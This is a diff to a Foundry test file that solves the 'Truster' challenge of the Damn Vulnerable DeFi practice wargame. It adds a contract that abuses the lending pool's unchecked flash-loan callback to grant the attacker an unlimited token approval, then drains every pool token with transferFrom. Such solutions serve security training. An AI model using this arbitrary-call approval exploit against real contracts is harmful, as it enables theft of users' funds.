@@ -7,6 +7,13 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
 
+contract Trustee{
+    constructor(TrusterLenderPool victim,address _token, address _attacker){
+        bytes memory callData = abi.encodeWithSignature("approve(address,uint256)",_attacker,type(uint256).max);
+        victim.flashLoan(0,_attacker,_token,callData);
+    }
+}
+
 contract Truster is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
 
@@ -14,6 +21,7 @@ contract Truster is Test {
     TrusterLenderPool internal trusterLenderPool;
     DamnValuableToken internal dvt;
     address payable internal attacker;
+    Trustee internal hack;
 
     function setUp() public {
         /**
@@ -38,13 +46,9 @@ contract Truster is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        hack = new Trustee(trusterLenderPool,address(dvt),attacker);
+        vm.prank(attacker);
+        dvt.transferFrom(address(trusterLenderPool),attacker,TOKENS_IN_POOL);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
